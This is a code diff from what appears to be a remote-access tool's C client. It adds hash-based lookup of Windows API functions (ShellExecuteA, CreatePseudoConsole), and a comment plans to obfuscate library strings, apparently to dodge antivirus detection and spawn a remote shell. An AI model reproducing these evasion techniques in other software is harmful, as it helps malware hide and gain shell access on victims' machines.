@@ -129,15 +129,25 @@ _findByHashFail:
 /* ======================================[[ Exposed API ]]====================================== */
 
 _ShellExecuteA oShellExecuteA;
+_CreatePseudoConsole oCreatePseudoConsole;
 
 void laikaO_init()
 {
     uint32_t hash;
 
     /* TODO: these library strings should probably be obfuscated (by a skid box maybe?) */
-    oShellExecuteA = findByHash("shell32.dll", 0x89858cd3);
+    oShellExecuteA = (_ShellExecuteA)findByHash("shell32.dll", 0x89858cd3);
+    oCreatePseudoConsole = (_CreatePseudoConsole)findByHash("kernel32.dll", 0x7310ef7);
 
-    hash = getHashName("ShellExecuteA"); /* 0x89858cd3 */
-    printf("ShellExecuteA: real is %p, hashed is %p. [HASH: %x]\n", (void *)ShellExecuteA,
-           findByHash("shell32.dll", hash), hash);
+/*
+    hash = getHashName("CreateProcessA"); // 0x9e687c1d
+    printf("CreateProcessA: real is %p, hashed is %p. [HASH: %x]\n",
+           (void *)CreateProcessA,
+           findByHash("kernel32.dll", hash), hash);
+
+    hash = getHashName("InitializeProcThreadAttributeList");
+    printf("InitializeProcThreadAttributeList: real is %p, hashed is %p. [HASH: %x]\n",
+           (void *)InitializeProcThreadAttributeList,
+           findByHash("kernel32.dll", hash), hash);
+*/
 }
